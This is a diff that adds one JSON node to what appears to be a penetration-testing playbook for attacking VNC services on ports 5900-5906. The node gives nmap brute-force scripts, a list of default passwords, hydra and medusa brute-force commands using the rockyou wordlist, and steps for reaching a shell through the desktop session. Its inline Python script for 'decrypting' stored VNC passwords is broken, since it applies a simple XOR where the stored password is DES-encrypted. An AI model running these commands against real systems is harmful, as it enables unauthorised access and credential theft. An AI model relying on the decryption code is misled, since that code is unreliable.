@@ -1,0 +1,22 @@
+{
+  "id": "vnc",
+  "phase": "RECON",
+  "title": "VNC (5900-5906)",
+  "body": "VNC = graphical desktop access. No-auth instances are instant wins. Brute force is fast. Decrypt stored VNC passwords from config files if you find them.",
+  "cmd": "nmap -p 5900-5906 -sV --script vnc-info,vnc-brute $ip\n\n# Check for no-auth (Security Type 1 = None)\nvncviewer $ip:5900   # try without password first\n\n# Common VNC passwords\n# password  12345678  vnc123  admin  (blank)\n\n# Brute force\nhydra -P /usr/share/wordlists/rockyou.txt vnc://$ip\nmedusa -h $ip -u \"\" -P passwords.txt -M vnc\n\n# If you have file access — decrypt stored VNC password\n# Location: ~/.vnc/passwd  C:\\Users\\user\\.vnc\\passwd\npython3 -c \"\nimport subprocess\nwith open('.vnc/passwd','rb') as f: data=f.read()\nkey=[23,82,107,6,35,78,88,7]\nfrom itertools import islice\nimport struct\ndef decrypt(data,key):\n    result=[]\n    for i,b in enumerate(data[:8]):\n        k=key[i%8]\n        result.append(b^k)\n    return bytes(result)\nprint(decrypt(data,key))\n\"\n\n# Once connected — get shell via VNC\n# Open terminal in VNC session then use standard shells",
+  "warn": null,
+  "choices": [
+    {
+      "label": "No auth — instant desktop access",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Cracked password — got desktop access",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Found passwd file — decrypted VNC creds",
+      "next": "creds_found"
+    }
+  ]
+}
